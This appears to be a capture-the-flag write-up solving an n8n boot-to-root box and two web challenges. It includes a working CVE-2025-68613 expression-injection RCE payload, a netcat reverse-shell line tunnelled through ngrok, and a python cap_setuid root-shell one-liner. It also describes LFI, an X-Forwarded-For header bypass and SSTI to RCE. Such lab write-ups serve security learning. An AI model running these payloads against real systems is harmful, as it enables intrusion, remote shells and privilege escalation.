<img width="754" height="273" alt="image" src="https://github.com/user-attachments/assets/a6089ddb-b74e-49ea-9843-47cbf45a0387" />

## B2R - r007

### PLUS ULTRA!!!

<img width="619" height="800" alt="image" src="https://github.com/user-attachments/assets/cc8bc682-8db9-417b-858d-dc8e4fac3629" />

We are given an instance that had **[n8n](https://n8n.io/)** runnning. 

> n8n is an open-source, visual workflow automation tool that lets users connect different apps and services to automate repetitive tasks, data movement, and complex processes without extensive coding. It uses a node-based system on a drag-and-drop canvas, allowing technical and non-technical users to build intricate integrations, from simple data syncs to advanced AI-powered workflows, with options for self-hosting or using their cloud service 

Once, authenticated. We're being greet with n8n critical **1.119.0 Version** which could lead to known RCE. 

<img width="1912" height="958" alt="image" src="https://github.com/user-attachments/assets/942a40cb-c665-4376-84c0-8bb51de32b93" />

<img width="676" height="485" alt="image" src="https://github.com/user-attachments/assets/0171ca9b-8b64-4c1b-9911-f7193290ee40" />

Here's more about **[CVE-2025-68613](https://github.com/wioui/n8n-CVE-2025-68613-exploit)**. So let's proceed in exploiting. First, we need to create a new workflow. However in our case, we already given `Project Plus Ultra`. 

Click the **workflow**, open **node panel** and add `Edit Fields (Set)` nodes.

<img width="1612" height="601" alt="image" src="https://github.com/user-attachments/assets/32f0454d-8b40-4cdd-b7f9-c0a9b058cef7" />

<img width="1557" height="862" alt="image" src="https://github.com/user-attachments/assets/f113644a-d871-4e9f-a433-663fb3988b24" />

<img width="506" height="404" alt="image" src="https://github.com/user-attachments/assets/166a781c-8436-44a1-873c-744684e1d4bf" />

The input form of the value is where we would inject our payload. 

```
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

<img width="1248" height="870" alt="image" src="https://github.com/user-attachments/assets/48624fdb-1b49-45c5-be24-28e222b07ab5" />

We verified the exploit is working. I then do a reverse shell connection that ive generate from **[revshells.com](https://www.revshells.com/)**. Don't forget to setup our listener to be publicly accessible. Here's our listener:
```
penelope.py -p 4444 
```
Used ngrok to make it publicly accessible
```
ngrok tcp 4444
```
Make sure to use ngrok ip and port
```
{{ (function(){ return this.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP PORT >/tmp/f').toString() })() }}
```

#### Shell as node

<img width="1557" height="432" alt="image" src="https://github.com/user-attachments/assets/2b319a40-e724-4a89-ad59-973422bf623f" />

Once i received a shell, straight away i look for any utilities could be use to download **[LinPEAS.sh](https://raw.githubusercontent.com/Mortemax/linux-privilege-escalation-awsome-script/refs/heads/master/linpeas.sh)** from github to PE (i don't have anytime at that time to do manual enumeration, cause i try this challenge around last 20 min)

<img width="932" height="294" alt="image" src="https://github.com/user-attachments/assets/971f5e07-ce0e-4663-8471-d42d1d6ff94d" />

```
wget https://raw.githubusercontent.com/Mortemax/linux-privilege-escalation-awsome-script/refs/heads/master/linpeas.sh                                                                     
```

As for the linpeas result:

<img width="886" height="456" alt="image" src="https://github.com/user-attachments/assets/46252836-68e4-44ba-83a9-5ab364383e2d" />

We identified there's python capabilties which can change uid. In this case, Python can use its `cap_setuid` ability to change its user ID to root, which means it can run commands as the root user. And we can spawn our own bash shell as root. For further explaination, can read **[here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)**

#### Shell as root
<img width="526" height="348" alt="image" src="https://github.com/user-attachments/assets/aac7c70e-659d-4c63-bab8-ea4cd32d7564" />

Exploit:
```
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Once we've gotten root priv, we can get the flag
```
CYNX{Plus_Ultr4_Sm4sh_Th3_K3rn3l}
```

## Web - Z3r0Day

### Zer0D4Y’s Little “Surprise”

<img width="621" height="896" alt="image" src="https://github.com/user-attachments/assets/d9e1dd99-b66d-458f-9c5c-f211b604222e" />

Upon visiting the instance, we will presented with login page. 

<img width="1547" height="966" alt="Screenshot 2026-01-18 185422" src="https://github.com/user-attachments/assets/920945ea-60d1-4f73-8251-f8912888e585" />

At first, i was really hooked in thinking it was some kind of jwt token or sqli after i decided to visit `robots.txt`. 

<img width="745" height="226" alt="image" src="https://github.com/user-attachments/assets/4374db6e-2be2-49bb-9971-0301f63bdae8" />

<img width="1547" height="901" alt="image" src="https://github.com/user-attachments/assets/2640718a-e292-4592-a486-786507d8464c" />

<img width="864" height="221" alt="image" src="https://github.com/user-attachments/assets/10f10438-0cd1-4323-8b77-480ebab8a209" />

<img width="894" height="192" alt="image" src="https://github.com/user-attachments/assets/f8422121-c081-45ba-86b2-7485f94e35e8" />

<img width="1311" height="679" alt="image" src="https://github.com/user-attachments/assets/a6263230-f4a0-4db9-a1ed-c72dd8e2aee5" />

Again, ive tried the keys as jwt secret and password but nothing much from those. So i tried to enumerate by using **gobuster** and find the `flag.txt`. Trust me, im asking myself as well... 

<img width="796" height="242" alt="image" src="https://github.com/user-attachments/assets/6f833b05-7ac2-46e8-97cb-94aeebbe300f" />

The cc trolled me really really hard with this challenge... 
```
CYNX{aWw_m4n_th0se_w3r3_mY_c00ki3s}
```

### Zer0D4Y’s “Internal Affairs”

<img width="621" height="913" alt="image" src="https://github.com/user-attachments/assets/437f7183-6482-4420-a324-9c1bfc50653c" />

Visit the instance, it gave us the same login page. However, this time we had given **"mary:Mary-123"** as the creds.

<img width="1354" height="958" alt="image" src="https://github.com/user-attachments/assets/baa95176-1d20-4683-812d-2462ba41800e" />

Inside the **/profile** we can find there's possible **LFI** for `user_id` parameter.

<img width="1570" height="968" alt="Screenshot 2026-01-18 201202" src="https://github.com/user-attachments/assets/1da6be44-deca-460f-8e3c-c6486b64e9c5" />

First flag part: `CYNX{bRuh_`

From the **LFI**, we able to uncover another part of the flag from users **1002, 1003, 1004**

<img width="1576" height="966" alt="Screenshot 2026-01-18 201621" src="https://github.com/user-attachments/assets/cc21128e-01e0-4394-b3fa-ead631363d02" />

Second flag part: `wh0`

<img width="1578" height="979" alt="Screenshot 2026-01-18 201634" src="https://github.com/user-attachments/assets/9f0d66a2-0968-4509-a96e-a9f48bbafddd" />

Third flag part: `_d3s1gn3d`

<img width="1556" height="940" alt="Screenshot 2026-01-18 201654" src="https://github.com/user-attachments/assets/c40ca09b-c1ab-42f0-800b-e0328ef57c44" />

Fourth flag part: `_th1s`

> (the "-" is typo)

Also, we've been hint that `Z3r0D4y` has gotten access to internal access. One of the ways should be by tampering the req header such as: `X-Forwarded-For: 127.0.0.1`

And its working!

<img width="1471" height="790" alt="Screenshot 2026-01-18 201843" src="https://github.com/user-attachments/assets/9dbe3a89-207f-49b6-84f4-a31f2cece9c1" />

We also identified there's an input form that vulnerable to SSTI

<img width="1425" height="818" alt="Screenshot 2026-01-18 201915" src="https://github.com/user-attachments/assets/40c35689-b226-405d-96ce-5037c6d32041" />

User input was rendered directly inside a template engine. Because of this, template expressions were executed on the server. This allowed reading system files and server data.

SSTI is exploitable. So we can find payload that will help us with **[RCE](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#exploit-the-ssti-by-calling-ospopenread)**. 

<img width="1446" height="685" alt="Screenshot 2026-01-18 202752" src="https://github.com/user-attachments/assets/6ca35543-ea73-4249-bdff-c908305c4f7a" />

<img width="1479" height="824" alt="Screenshot 2026-01-18 202809" src="https://github.com/user-attachments/assets/9788d2b4-3d9f-4c39-bca1-699cabfff4f3" />

<img width="1507" height="790" alt="Screenshot 2026-01-18 202835" src="https://github.com/user-attachments/assets/652bbf6a-fc78-4679-80a4-3b5a70efa1d1" />

<img width="1264" height="829" alt="Screenshot 2026-01-18 202905" src="https://github.com/user-attachments/assets/d281e996-f5f8-49fb-9fab-564cad76684b" />

After gaining RCE, we able to find last part of the flag. 

Last flag part: `_sh1ttttttttttte}`

```
CYNX{bRuh_wh0_d3s1gn3d_th1s_sh1ttttttttttte}
```
